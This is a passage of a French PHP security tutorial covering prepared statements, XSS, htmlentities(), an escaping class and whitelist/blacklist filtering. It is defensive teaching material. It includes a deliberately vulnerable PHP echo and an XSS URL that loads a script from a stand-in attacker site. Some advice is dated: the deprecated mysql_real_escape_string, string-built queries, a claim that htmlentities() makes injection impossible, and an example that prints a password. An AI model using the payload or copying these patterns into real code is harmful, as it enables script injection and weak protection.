+	mysqli_stmt_bind_param($prepa, 'ss', $pseudo, $password);
+
+	// Exécution de la requête
+	$resultat = mysqli_stmt_execute($prepa);
+
+	// Récupération des résultats
+	mysqli_stmt_store_result($prepa);
+	
+	// On lie les résultats à des variables PHP
+	mysqli_stmt_bind_result($prepa, $id, $pseudo, $password);
+	
+	// Affichage des résultats
+	mysqli_stmt_fetch($prepa);
+	echo 'Salut ' . htmlentities($pseudo);
+	echo 'ID : ' . $id;
+	echo 'Password ' . $password;
+
+	// Fermeture de la requête
+	mysqli_stmt_close($prepa);
+
+?&gt;</code></pre><p id="r-377897" data-claire-element-id="377897">Vous le voyez, c'est quand même assez fastidieux d'écrire une requête préparée. Mais rappelez-vous que c'est une des méthodes les plus sûres pour envoyer des requêtes au serveur. ^^ Pour une utilisation plus facile des requêtes préparées, je recommande <strong>PDO</strong> (PHP Data Object) mais le principe reste le même.</p><p id="r-377898" data-claire-element-id="377898">Pour les curieux, voilà comment on prépare et on exécute une requête avec <strong>PDO</strong> :</p><pre id="r-377899" data-claire-element-id="377899"><code data-claire-semantic="html+php">&lt;?php
+	// $dbh correspond à une connexion avec une base de données (MySQL, PostgreSQL, Oracle...)
+	$stmt = $dbh-&gt;prepare(&quot;INSERT INTO REGISTRY (name, value) VALUES (:name, :value)&quot;);
+	$stmt-&gt;bindParam(':name', $name);
+	$stmt-&gt;bindParam(':value', $value);
+
+	// Insertion d'une ligne
+	$name = 'one';
+	$value = 1;
+	$stmt-&gt;execute();
+?&gt;</code></pre><aside id="r-377901" data-claire-element-id="377901" data-claire-semantic="information"><p id="r-377900" data-claire-element-id="377900">Pour info, j'utilise maintenant <strong>PDO</strong> pour gérer les échanges avec mes bases de données et j'essaye au maximum de préparer mes requêtes. Sinon pour échapper les chaînes transmises il faut utiliser la méthode <strong>PDO::quote()</strong>.</p></aside>
+<aside class="aside-menu">
+<ul class="content-menu subchapter" role="navigation">
+<li class="tuto">
+<a href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees">Sécurité PHP, sécuriser les flux de données</a>
+</li>
+<ul class="subchapter-parts">
+<li>
+<a href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/architecture-web">
+Architecture web
+</a>
+</li>
+<li class="active">
+<a href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/proteger-les-donnees-entrant-dans-la-bdd">
+Protéger les données entrant dans la BDD
+</a>
+</li>
+<li>
+<a href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/proteger-les-donnees-issues-de-la-bdd-ou-de-formulaires">
+Protéger les données issues de la BDD ou de formulaires
+</a>
+</li>
+<li>
+<a href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/securite-centraliser">
+Sécurité = centraliser
+</a>
+</li>
+<li>
+<a href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/les-listes-controle-des-donnees">
+Les listes : contrôle des données
+</a>
+</li>
+</ul>
+</ul>
+</aside>
+</div>
+<div id="content-bottom-menu"></div>
+<hr/>
+<div class="paginate-tuto">
+<a class="before" href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/architecture-web">
+<span class="arrow"></span>
+<span class="next">Architecture web</span>
+</a>
+<a class="after" href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/proteger-les-donnees-issues-de-la-bdd-ou-de-formulaires">
+<span class="next">Protéger les données issues de la BDD ou de formulaires</span>
+<span class="arrow"></span>
+</a>
+</div>
+<hr class="bottom"/>
+<div class="clear"></div> <div class="adBan">
+<script type='text/javascript'>
+    if (window.innerWidth >= 728)
+    {
+        document.write('<div id="div-gpt-ad-1350977194635-8" class="megaban"></div>');
+        googletag.cmd.push(function() {
+            googletag.display('div-gpt-ad-1350977194635-8');
+        });
+    }
+            else
+        {
+            document.write('<div id="div-gpt-ad-1350977284180-8" class="miniban"></div>');
+            googletag.cmd.push(function() {
+                googletag.display('div-gpt-ad-1350977284180-8');
+            });
+        }
+    </script>
+</div>
+<div class="clear"></div><a name="ProtgerlesdonnesissuesdelaBDDoudeformulaires"></a><h2>Protéger les données issues de la BDD ou de formulaires</h2><div class="paginate-tuto">
+<a class="before" href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/proteger-les-donnees-entrant-dans-la-bdd">
+<span class="arrow"></span>
+<span class="next">Protéger les données entrant dans la BDD</span>
+</a>
+<a class="after" href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/securite-centraliser">
+<span class="next">Sécurité = centraliser</span>
+<span class="arrow"></span>
+</a>
+</div>
+<hr class="top"/>
+<div class="clear"></div> <div id="content" role="article">
+<h2 id="r-injections-html-ou-xss" data-claire-element-id="377923">Injections HTML ou XSS</h2><p id="r-377905" data-claire-element-id="377905">Il existe un autre grand type d'injection connue des pirates, c'est l'injection HTML ou plus communément appelée <em>Cross-Site Scripting</em> (XSS).</p><div id="r-377907" data-claire-element-id="377907" data-claire-semantic="question"><p id="r-377906" data-claire-element-id="377906">Pourquoi <strong>X</strong>SS ? Ça ne devrait pas plutôt être <strong>C</strong>SS pour <strong>C</strong><em>Cross-Site Scripting</em> ?</p></div><p id="r-377908" data-claire-element-id="377908">Eh bien si, mais figurez-vous que l'acronyme CSS est déjà utilisé pour <em>Cascading Style Sheet</em>. Ce sont les feuilles de styles qui permettent la mise en place du design d'un site web. On a donc pensé à remplacer le C par un X histoire de ne pas confondre. De plus, X symbolise une croix qui se traduit par <em>cross</em> en anglais.</p><h3 id="r-attention-au-danger-des-xss" data-claire-element-id="377922">Attention au danger des XSS !</h3><p id="r-377909" data-claire-element-id="377909">Si vos flux de données ne sont pas protégés à l'affichage, les pirates peuvent entrer des balises nocives et notamment du JavaScript. En bidouillant un peu, on peut facilement injecter de nouvelles balises et donc réécrire la page XHTML à notre guise. C'est pour ça qu'en français, on traduit l'acronyme XSS par injection HTML.</p><p id="r-377910" data-claire-element-id="377910">Voilà un exemple de XSS :</p><pre id="r-377911" data-claire-element-id="377911"><code data-claire-semantic="html+php">&lt;html&gt;
+	&lt;head&gt;
+		&lt;title&gt;Injection HTML&lt;/title&gt;
+	&lt;/head&gt;
+	&lt;body&gt;
+		&lt;?php echo &quot;Salut, tu t'appelles &quot;.$_GET['pseudo']; ?&gt;
+	&lt;/body&gt;
+&lt;/html&gt;</code></pre><p id="r-377912" data-claire-element-id="377912">En modifiant directement l'URL ainsi :</p><pre id="r-377913" data-claire-element-id="377913"><code>http://monsiteweb.com/index.php?pseudo=%3Ci%3zozor%3C%2Fi%3E</code></pre><p id="r-377914" data-claire-element-id="377914">ce qui équivaut à :</p><pre id="r-377915" data-claire-element-id="377915"><code>http://monsiteweb.com/index.php?pseudo=&lt;i&gt;zozor&lt;/i&gt;</code></pre><p id="r-377916" data-claire-element-id="377916">On parvient à mettre en italique le nom <em>zozor</em>.</p><div id="r-377918" data-claire-element-id="377918" data-claire-semantic="question"><p id="r-377917" data-claire-element-id="377917">Et alors, c'est pas dangereux de mettre en italique à ce que je sache ?</p></div><p id="r-377919" data-claire-element-id="377919">Certes, la balise <strong>&lt;i&gt;</strong> n'est pas nocive mais si on peut inclure une balise HTML, pourquoi ne pourrait-on pas en inclure d'autres ? Il est très simple de charger un script externe pirate depuis cette page avec un soupçon de JavaScript :</p><pre id="r-377920" data-claire-element-id="377920"><code>http://monsiteweb.com/index.php?pseudo=&lt;i&gt;zozor&lt;/i&gt;&lt;script src=&quot;http://sitepirate.com/injection.js&quot; &gt;</code></pre><p id="r-377921" data-claire-element-id="377921">Cette nouvelle injection demande au navigateur d'inclure un fichier en JavaScript provenant d'un site pirate.</p><h2 id="r-htmlentities" data-claire-element-id="377936">htmlentities()</h2><pre id="r-377924" data-claire-element-id="377924"><code data-claire-semantic="console">string htmlentities  ( string $string  [, int $quote_style  [, string $charset  [, bool $double_encode  ]]] )</code></pre><p id="r-377925" data-claire-element-id="377925">Pour éviter les injections de ce type, la meilleure solution est de rendre toutes les balise XHTML inopérantes avec la fonction <em>htmlentities()</em>.<br/> Reprenons l'exemple précédent :</p><pre id="r-377926" data-claire-element-id="377926"><code data-claire-semantic="html+php">&lt;html&gt;
+	&lt;head&gt;
+		&lt;title&gt;Injection HTML&lt;/title&gt;
+	&lt;/head&gt;
+	&lt;body&gt;
+		&lt;?php echo &quot;Salut, tu t'appelles &quot;.htmlentities($_GET['pseudo']); ?&gt;
+	&lt;/body&gt;
+&lt;/html&gt;</code></pre><p id="r-377927" data-claire-element-id="377927">Là, même en modifiant l'URL et en injectant des balises nocives, notre page HTML est protégée.</p><pre id="r-377928" data-claire-element-id="377928"><code>http://monsiteweb.com/index.php?pseudo=&lt;i&gt;zozor&lt;/i&gt;&lt;script src=&quot;http://sitepirate.com/injection.js&quot; &gt;</code></pre><p id="r-377929" data-claire-element-id="377929">Notre page affiche à présent :</p><pre id="r-377930" data-claire-element-id="377930"><code>&lt;i&gt;zozor&lt;/i&gt;&lt;script src=&quot;http://sitepirate.com/injection.js&quot; &gt;</code></pre><p id="r-377931" data-claire-element-id="377931">Et le code source de la page :</p><pre id="r-377932" data-claire-element-id="377932"><code data-claire-semantic="html">&lt;body&gt;
+	&amp;lt;i&amp;gt;zozor&amp;lt;/i&amp;gt;&amp;lt;script src=&amp;quot;injection.js&amp;quot; &amp;gt;
+&lt;/body&gt;</code></pre><p id="r-377933" data-claire-element-id="377933">La fonction <em>htmlentities()</em> a remplacé dans la chaîne tous les caractères possibles en leur équivalent HTML. L'injection HTML devient dès lors impossible.</p><aside id="r-377935" data-claire-element-id="377935" data-claire-semantic="warning"><p id="r-377934" data-claire-element-id="377934">Il existe des injections de code JavaScript qui se passent des caractères spéciaux de HTML pour s'exécuter comme le point virgule, la parenthèse ainsi que les accolades. Il est donc toujours possible de mener à bien une injection HTML mais qui sera diminuée puisque la quasi totalité des caractères utiles en JavaScript ont été désactivés par <em>htmlentities()</em>. Essayez donc de créer une attaque en utilisant seulement les parenthèses, les points virgules et les accolades : c'est pas gagné ! :p</p></aside><h2 id="r-htmlspecialchars" data-claire-element-id="377950">htmlspecialchars()</h2><p id="r-377937" data-claire-element-id="377937">Prototype :</p><pre id="r-377938" data-claire-element-id="377938"><code data-claire-semantic="console">string htmlspecialchars  ( string $string  [, int $quote_style  [, string $charset  [, bool $double_encode  ]]] )</code></pre><p id="r-377939" data-claire-element-id="377939"><em>htmlspecialchars()</em> est une version moins complète de <em>htmlentities()</em>. Attention, je ne dis pas qu'elle est moins sécuritaire ! En effet, si les <em>charset</em> (exemple : UTF-8) sont convenablement maîtrisés entre la base de données et la page XHTML, elle est tout aussi performante que son homologue <em>htmlentities()</em>.<br/> Cette fonction remplace les caractères suivants par leur entité HTML :</p><ul id="r-377948" data-claire-element-id="377948"><li id="r-377941" data-claire-element-id="377941"><p id="r-377940" data-claire-element-id="377940">Les délimiteurs de balise <strong>&lt;</strong> et <strong>&gt;</strong> ;</p></li><li id="r-377943" data-claire-element-id="377943"><p id="r-377942" data-claire-element-id="377942">Les guillemets simples <strong>'</strong> ;</p></li><li id="r-377945" data-claire-element-id="377945"><p id="r-377944" data-claire-element-id="377944">Les guillemets doubles <strong>&quot;</strong> ;</p></li><li id="r-377947" data-claire-element-id="377947"><p id="r-377946" data-claire-element-id="377946">Le &quot;et commercial&quot; <strong>&amp;</strong>.</p></li></ul><p id="r-377949" data-claire-element-id="377949">Je vous conseille donc fortement d'utiliser <em>htmlentities()</em> plutôt que <em>htmlspecialchars()</em> si vous n'êtes pas certain de maîtriser vos <em>charsets</em>.</p>
+<aside class="aside-menu">
+<ul class="content-menu subchapter" role="navigation">
+<li class="tuto">
+<a href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees">Sécurité PHP, sécuriser les flux de données</a>
+</li>
+<ul class="subchapter-parts">
+<li>
+<a href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/architecture-web">
+Architecture web
+</a>
+</li>
+<li>
+<a href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/proteger-les-donnees-entrant-dans-la-bdd">
+Protéger les données entrant dans la BDD
+</a>
+</li>
+<li class="active">
+<a href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/proteger-les-donnees-issues-de-la-bdd-ou-de-formulaires">
+Protéger les données issues de la BDD ou de formulaires
+</a>
+</li>
+<li>
+<a href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/securite-centraliser">
+Sécurité = centraliser
+</a>
+</li>
+<li>
+<a href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/les-listes-controle-des-donnees">
+Les listes : contrôle des données
+</a>
+</li>
+</ul>
+</ul>
+</aside>
+</div>
+<div id="content-bottom-menu"></div>
+<hr/>
+<div class="paginate-tuto">
+<a class="before" href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/proteger-les-donnees-entrant-dans-la-bdd">
+<span class="arrow"></span>
+<span class="next">Protéger les données entrant dans la BDD</span>
+</a>
+<a class="after" href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/securite-centraliser">
+<span class="next">Sécurité = centraliser</span>
+<span class="arrow"></span>
+</a>
+</div>
+<hr class="bottom"/>
+<div class="clear"></div> <div class="adBan">
+<script type='text/javascript'>
+    if (window.innerWidth >= 728)
+    {
+        document.write('<div id="div-gpt-ad-1350977194635-8" class="megaban"></div>');
+        googletag.cmd.push(function() {
+            googletag.display('div-gpt-ad-1350977194635-8');
+        });
+    }
+            else
+        {
+            document.write('<div id="div-gpt-ad-1350977284180-8" class="miniban"></div>');
+            googletag.cmd.push(function() {
+                googletag.display('div-gpt-ad-1350977284180-8');
+            });
+        }
+    </script>
+</div>
+<div class="clear"></div><a name="Scuritcentraliser"></a><h2>Sécurité = centraliser</h2><div class="paginate-tuto">
+<a class="before" href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/proteger-les-donnees-issues-de-la-bdd-ou-de-formulaires">
+<span class="arrow"></span>
+<span class="next">Protéger les données issues de la BDD ou de formulaires</span>
+</a>
+<a class="after" href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/les-listes-controle-des-donnees">
+<span class="next">Les listes : contrôle des données</span>
+<span class="arrow"></span>
+</a>
+</div>
+<hr class="top"/>
+<div class="clear"></div> <div id="content" role="article">
+<h2 id="r-la-securite-c-est-la-classe" data-claire-element-id="377955">La sécurité, c'est la classe</h2><p id="r-377952" data-claire-element-id="377952">Nous avons donc d'une part notre fonction <em>securite_bdd()</em> qui se charge de contrôler les chaînes transmises à la BDD et <em>htmlentities()</em> qui s'occupe de gérer la sécurité à l'affichage.<br/> Ces deux fonctions servent toutes les deux à sécuriser les flux de données, alors pourquoi ne pas les regrouper ?<br/> C'est ce que nous allons faire : créons une classe <strong>Sécurité</strong> qui centralisera nos deux fonctions.</p><aside id="r-377954" data-claire-element-id="377954" data-claire-semantic="information"><p id="r-377953" data-claire-element-id="377953">Pour ceux qui ne connaissent pas la POO en PHP (Programmation Orientée Objet), je vous recommande d'aller lire le tutoriel de notre ami M@téo21 sur le C++ qui pose les grands principes de ce paradigme de programmation. :)</p></aside><h2 id="r-creation-de-notre-classe" data-claire-element-id="377963">Création de notre classe</h2><pre id="r-377956" data-claire-element-id="377956"><code data-claire-semantic="html+php">&lt;?php
+	class Securite
+	{
+		// Données entrantes
+		public static function bdd($string)
+		{
+			// On regarde si le type de string est un nombre entier (int)
+			if(ctype_digit($string))
+			{
+				$string = intval($string);
+			}
+			// Pour tous les autres types
+			else
+			{
+				$string = mysql_real_escape_string($string);
+				$string = addcslashes($string, '%_');
+			}
+				
+			return $string;
+
+		}
+		// Données sortantes
+		public static function html($string)
+		{
+			return htmlentities($string);
+		}
+	}
+?&gt;</code></pre><p id="r-377957" data-claire-element-id="377957">Un des grands principes de la sécurité repose sur la centralisation des traitements de données. <br/> À présent, avant d'envoyer une chaîne dans votre requête, vous ferez :</p><pre id="r-377958" data-claire-element-id="377958"><code data-claire-semantic="html+php">&lt;?php
+	$pseudo = Securite::bdd($_POST['pseudo']);
+	$password = Securite::bdd( $_POST['password'] );
+
+	$requete = &quot;SELECT * FROM membre
+	WHERE pseudo = '$pseudo' AND password = '$password' &quot;;
+?&gt;</code></pre><p id="r-377959" data-claire-element-id="377959">Et pour afficher du texte qui provient de l'internaute ou de la base de données :</p><pre id="r-377960" data-claire-element-id="377960"><code data-claire-semantic="html+php">&lt;?php
+	echo Securite::html($_GET['pseudo']);
+?&gt;</code></pre><aside id="r-377962" data-claire-element-id="377962" data-claire-semantic="information"><p id="r-377961" data-claire-element-id="377961">Notre classe <strong>Securite</strong> devrait, par souci de logique, s'appeler <strong>Échappement</strong> puisqu'elle se contente d'échapper nos chaînes de caractères pour pouvoir être traitées par MySQL ou par le navigateur.</p></aside>
+<aside class="aside-menu">
+<ul class="content-menu subchapter" role="navigation">
+<li class="tuto">
+<a href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees">Sécurité PHP, sécuriser les flux de données</a>
+</li>
+<ul class="subchapter-parts">
+<li>
+<a href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/architecture-web">
+Architecture web
+</a>
+</li>
+<li>
+<a href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/proteger-les-donnees-entrant-dans-la-bdd">
+Protéger les données entrant dans la BDD
+</a>
+</li>
+<li>
+<a href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/proteger-les-donnees-issues-de-la-bdd-ou-de-formulaires">
+Protéger les données issues de la BDD ou de formulaires
+</a>
+</li>
+<li class="active">
+<a href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/securite-centraliser">
+Sécurité = centraliser
+</a>
+</li>
+<li>
+<a href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/les-listes-controle-des-donnees">
+Les listes : contrôle des données
+</a>
+</li>
+</ul>
+</ul>
+</aside>
+</div>
+<div id="content-bottom-menu"></div>
+<hr/>
+<div class="paginate-tuto">
+<a class="before" href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/proteger-les-donnees-issues-de-la-bdd-ou-de-formulaires">
+<span class="arrow"></span>
+<span class="next">Protéger les données issues de la BDD ou de formulaires</span>
+</a>
+<a class="after" href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/les-listes-controle-des-donnees">
+<span class="next">Les listes : contrôle des données</span>
+<span class="arrow"></span>
+</a>
+</div>
+<hr class="bottom"/>
+<div class="clear"></div> <div class="adBan">
+<script type='text/javascript'>
+    if (window.innerWidth >= 728)
+    {
+        document.write('<div id="div-gpt-ad-1350977194635-8" class="megaban"></div>');
+        googletag.cmd.push(function() {
+            googletag.display('div-gpt-ad-1350977194635-8');
+        });
+    }
+            else
+        {
+            document.write('<div id="div-gpt-ad-1350977284180-8" class="miniban"></div>');
+            googletag.cmd.push(function() {
+                googletag.display('div-gpt-ad-1350977284180-8');
+            });
+        }
+    </script>
+</div>
+<div class="clear"></div><a name="Leslistescontrledesdonnes"></a><h2>Les listes : contrôle des données</h2><div class="paginate-tuto">
+<a class="before" href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/securite-centraliser">
+<span class="arrow"></span>
+<span class="next">Sécurité = centraliser</span>
+</a>
+</div>
+<hr class="top"/>
+<div class="clear"></div> <div id="content" role="article">
+<h2 id="r-liste-blanche" data-claire-element-id="377982">Liste blanche</h2><h3 id="r-definition-et-exemple" data-claire-element-id="377979">Définition et exemple</h3><p id="r-377965" data-claire-element-id="377965">Une liste blanche correspond à l'ensemble des données que l'internaute a le droit de rentrer. Instaurer une liste blanche permet un contrôle total sur les données transmises.</p><p id="r-377966" data-claire-element-id="377966">Par exemple, si vous proposez lors d'une inscription de choisir le pays d'origine, vous pouvez facilement vérifier si le pays est valide ou non. On implémente souvent ce type de liste avec les tableaux en PHP.</p><p id="r-377967" data-claire-element-id="377967">Exemple de mise en place d'une liste blanche :</p><pre id="r-377968" data-claire-element-id="377968"><code data-claire-semantic="html+php">&lt;?php
+	$liste_pays = array(
+	'Belgique',
+	'Canada',
+	'France',
+	'Hongrie',
+	'Slovénie'
+	);
+?&gt;</code></pre><p id="r-377969" data-claire-element-id="377969">Pour la vérification, c'est très facile :</p><pre id="r-377970" data-claire-element-id="377970"><code data-claire-semantic="html+php">&lt;?php
+	$pays_transmis = $_POST['pays'];
+	
+	// Vérification de la présence du pays dans la liste
+	if(in_array($pays_transmis, $liste_pays))
+	{
+		echo 'pays valide.';
+	}
+	else
+	{
+		echo 'pays invalide, veuillez ressaisir votre pays. ';
+	}
+?&gt;</code></pre><p id="r-377971" data-claire-element-id="377971">La fonction <em>in_array()</em> renvoie un booléen :</p><ul id="r-377976" data-claire-element-id="377976"><li id="r-377973" data-claire-element-id="377973"><p id="r-377972" data-claire-element-id="377972"><strong>true</strong> si la valeur est présente dans le tableau ;</p></li><li id="r-377975" data-claire-element-id="377975"><p id="r-377974" data-claire-element-id="377974"><strong>false</strong> en cas d'absence.</p></li></ul><pre id="r-377977" data-claire-element-id="377977"><code data-claire-semantic="console">bool in_array  ( mixed $needle  , array $haystack  [, bool $strict  ] )</code></pre><p id="r-377978" data-claire-element-id="377978">Bien entendu, les tableaux ne sont pas la meilleure solution à adopter dans tous les cas. La base de données peut s'avérer plus efficace pour stocker un plus grand nombre de valeurs autorisées. En effet, créer un tableau composé de plus de 500 valeurs devient assez lourd à gérer.</p><h3 id="r-limites-de-la-liste-blanche" data-claire-element-id="377981">Limites de la liste blanche</h3><p id="r-377980" data-claire-element-id="377980">Cette technique de contrôle de données est particulièrement efficace mais peut se révéler très vite complexe à gérer. En effet, comment contrôler un champ <strong>prénom</strong> ou <strong>nom</strong> ? Il existe plusieurs milliers de prénoms et ne parlons pas des noms ! La liste blanche s'avère alors très dure à mettre en place.</p><h2 id="r-liste-noire" data-claire-element-id="377994">Liste noire</h2><h3 id="r-definition-et-exemple-1" data-claire-element-id="377991">Définition et exemple</h3><p id="r-377983" data-claire-element-id="377983">Contrairement à la liste blanche, la liste noire filtre les données interdites. On autorise donc tout, sauf certaines valeurs que l'on aura précisé. La liste noire permet généralement de lutter contre le <em>spam</em> et les robots. En effet, le but du <em>spam</em> est de promouvoir un produit ou un service en envoyant le plus de messages possibles et de manière à ce qu'ils soient visibles par le plus grand nombre. Vos forums ont peut-être déjà été la cible du <em>spam</em> et une bonne solution est de mettre en place une liste noire.</p><p id="r-377984" data-claire-element-id="377984">Mettons en place une liste noire qui filtre les insultes :</p><pre id="r-377985" data-claire-element-id="377985"><code data-claire-semantic="html+php">&lt;?php
+	$liste_insulte = array(
+	'crapule',
+	'chenapan',
+	'goujat',
+	'manant'
+	);
+?&gt;</code></pre><p id="r-377986" data-claire-element-id="377986">On contrôle ensuite les messages à afficher :</p><pre id="r-377987" data-claire-element-id="377987"><code data-claire-semantic="html+php">&lt;?php
+	// Récupération depuis une BDD
+	$message = $resultat['message'];
+	
+	// Le message est considéré comme valide
+	$autorisation = true;
+
+	// On parcourt toutes les insultes de la liste noire
+	foreach($liste_insulte as $insulte)
+	{
+		// Si une insulte est comprise dans le message
+		if(stripos($message, $insulte) !== false)
+		{
+			$autorisation = false;
+			break;
+		}
+	}
+?&gt;</code></pre><p id="r-377988" data-claire-element-id="377988">On obtient une variable <strong>$autorisation</strong> qui est un booléen (<em>true</em> ou <em>false</em>).</p><p id="r-377989" data-claire-element-id="377989">Prototype de la fonction stripos() :</p><pre id="r-377990" data-claire-element-id="377990"><code data-claire-semantic="console">int stripos  ( string $haystack  , string $needle  [, int $offset  ] )</code></pre><h3 id="r-limites-de-la-liste-noire" data-claire-element-id="377993">Limites de la liste noire</h3><p id="r-377992" data-claire-element-id="377992">La liste noire est une bonne alternative à la liste blanche. Cependant, il faut toujours la mettre à jour pour contrer les nouveaux messages de <em>spam</em>.<br/> Par exemple, le mot <strong>cr@pule</strong> n'est pas filtré par notre liste noire ; tout comme le mot <strong>CRAPUL3</strong>. Il faut donc prendre en compte tous ces changements pour avoir une liste noire fiable.</p><h2 id="r-liste-grise" data-claire-element-id="378011">Liste grise</h2><p id="r-377995" data-claire-element-id="377995">Du noir et du blanc, ça donne... du gris ! :magicien: <br/> La meilleure technique pour filtrer les données est d'utiliser en complément la liste blanche et la liste noire. Je vous recommande donc de préparer, pour les cas où c'est possible, deux listes différentes :</p><ul id="r-378000" data-claire-element-id="378000"><li id="r-377997" data-claire-element-id="377997"><p id="r-377996" data-claire-element-id="377996">une liste blanche qui autorise seulement des valeurs données ;</p></li><li id="r-377999" data-claire-element-id="377999"><p id="r-377998" data-claire-element-id="377998">une liste noire qui filtre les données incorrectes.</p></li></ul><p id="r-378001" data-claire-element-id="378001">En effet, pour filtrer un champ pseudo par exemple je ne vois pas comment écrire une liste blanche donc dans ce cas la liste noire est préconisée :p .<br/> En revanche pour gérer un sondage (nombre de possibilités finie) il est recommandé d'instaurer une liste blanche. <br/> Ainsi si vous arrivez à gérer parfaitement les différents cas votre application sera contrôlée par un ensemble de listes blanches et noires et donc des listes grises : le filtrage des données est considérablement augmenté !</p><p id="r-378002" data-claire-element-id="378002">J'espère que vous avez compris que vous deviez maitriser vos flux de données pour protéger correctement votre application web.<br/> Les failles XSS et les injections SQL peuvent facilement être évitées comme je vous l'ai brièvement expliqué.</p><p id="r-378003" data-claire-element-id="378003">Terminons par une petite synthèse de ce que vous devez absolument faire pour controler vos données :</p><ul id="r-378010" data-claire-element-id="378010"><li id="r-378005" data-claire-element-id="378005"><p id="r-378004" data-claire-element-id="378004">Protéger les chaînes de caractères dans vos requêtes, la meilleure solution à ce jour étant la préparation de vos requêtes ;</p></li><li id="r-378007" data-claire-element-id="378007"><p id="r-378006" data-claire-element-id="378006">Protéger les données affichées par le navigateur avec <em>htmlentities()</em> ;</p></li><li id="r-378009" data-claire-element-id="378009"><p id="r-378008" data-claire-element-id="378008">Mettre en place un filtre systématique par liste grise.</p></li></ul><h2 id="r-pour-aller-plus-loin-26" data-claire-element-id="378025">Pour aller plus loin...</h2><p id="r-378012" data-claire-element-id="378012">Voici quelques références incontournables pour approfondir vos connaissances :</p><ul id="r-378023" data-claire-element-id="378023"><li id="r-378014" data-claire-element-id="378014"><p id="r-378013" data-claire-element-id="378013"><a href="http://www.siteduzero.com/tuto-3-5395-0-apprenez-a-programmer-en-c.html#part_3863">La Programmation Orientée Objet</a></p></li><li id="r-378016" data-claire-element-id="378016"><p id="r-378015" data-claire-element-id="378015"><a href="http://www.siteduzero.com/tuto-3-8332-1-pdo-interface-d-acces-aux-bdd.html">PDO : interface d'accès aux BDD</a></p></li><li id="r-378018" data-claire-element-id="378018"><p id="r-378017" data-claire-element-id="378017"><a href="http://www.siteduzero.com/tuto-3-4404-1-requete-preparee.html">Requête préparée</a></p></li><li id="r-378020" data-claire-element-id="378020"><p id="r-378019" data-claire-element-id="378019"><a href="http://www.siteduzero.com/tuto-3-25489-1-le-danger-des-failles-xss.html">Le danger des failles XSS</a></p></li><li id="r-378022" data-claire-element-id="378022"><p id="r-378021" data-claire-element-id="378021"><a href="http://www.siteduzero.com/tuto-3-11537-1-eviter-les-injections-sql.html">Éviter les injections SQL</a></p></li></ul><p id="r-378024" data-claire-element-id="378024">A bientôt pour un nouvel épisode sur la sécurité !</p>
+<aside class="aside-menu">
+<ul class="content-menu subchapter" role="navigation">
+<li class="tuto">
+<a href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees">Sécurité PHP, sécuriser les flux de données</a>
+</li>
+<ul class="subchapter-parts">
+<li>
+<a href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/architecture-web">
+Architecture web
+</a>
+</li>
+<li>
+<a href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/proteger-les-donnees-entrant-dans-la-bdd">
+Protéger les données entrant dans la BDD
+</a>
+</li>
+<li>
+<a href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/proteger-les-donnees-issues-de-la-bdd-ou-de-formulaires">
+Protéger les données issues de la BDD ou de formulaires
+</a>
+</li>
+<li>
+<a href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/securite-centraliser">
+Sécurité = centraliser
+</a>
+</li>
+<li class="active">
+<a href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/les-listes-controle-des-donnees">
+Les listes : contrôle des données
+</a>
+</li>
+</ul>
+</ul>
+</aside>
+</div>
+<div id="content-bottom-menu"></div>
+<hr/>
+<div class="paginate-tuto">
+<a class="before" href="http://62.4.17.167/informatique/tutoriels/securite-php-securiser-les-flux-de-donnees/securite-centraliser">
+<span class="arrow"></span>
+<span class="next">Sécurité = centraliser</span>
+</a>
+</div>
+<hr class="bottom"/>
+<div class="clear"></div> <div class="adBan">
+<script type='text/javascript'>
+    if (window.innerWidth >= 728)
+    {
+        document.write('<div id="div-gpt-ad-1350977194635-8" class="megaban"></div>');
+        googletag.cmd.push(function() {
+            googletag.display('div-gpt-ad-1350977194635-8');
+        });
+    }
+            else
+        {
+            document.write('<div id="div-gpt-ad-1350977284180-8" class="miniban"></div>');
+            googletag.cmd.push(function() {
+                googletag.display('div-gpt-ad-1350977284180-8');
+            });
+        }
+    </script>
+</div>
+<div class="clear"></div>
